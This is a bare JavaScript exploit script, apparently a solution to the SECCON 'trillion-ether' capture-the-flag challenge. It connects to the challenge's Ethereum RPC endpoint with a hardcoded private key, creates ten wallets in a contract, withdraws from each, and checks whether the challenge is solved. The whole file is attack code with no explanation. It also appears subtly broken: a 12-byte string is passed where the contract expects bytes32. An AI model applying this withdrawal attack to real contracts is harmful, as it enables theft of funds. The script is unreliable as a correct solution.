const { ethers } = require("ethers");
// RPCエンドポイントとプライベートキーを設定
const provider = new ethers.JsonRpcProvider("http://trillion-ether.seccon.games:8545/02548d36-ae23-4446-8fec-b05cee62cbd9");
const wallet = new ethers.Wallet("8021c06727f3dd00de39ec39c6e107dbe770a0833703178ee9b123d8821038e7", provider);

// コントラクトアドレスとABIを設定
const contractAddress = "0x8d35Da5DC550B317245a8dD117689323d1B7aDbE";
const abi = [
    "function createWallet(bytes32 name) external payable",
    "function withdraw(uint256 walletId, uint256 amount) external",
    "function isSolved() external view returns (bool)"
];

const contract = new ethers.Contract(contractAddress, abi, wallet);

async function exploit() {
    // 複数のウォレットを作成
    for (let i = 0; i < 10; i++) {
        let tx = await contract.createWallet(ethers.toUtf8Bytes("AttackWallet"), { value: ethers.parseEther("1") });
        await tx.wait();
    }

    // 各ウォレットから引き出しを実行
    for (let i = 0; i < 10; i++) {
        let tx = await contract.withdraw(i, ethers.parseEther("1"));
        await tx.wait();
    }

    // チェック
    const solved = await contract.isSolved();
    console.log("Is Solved:", solved);
}

exploit();
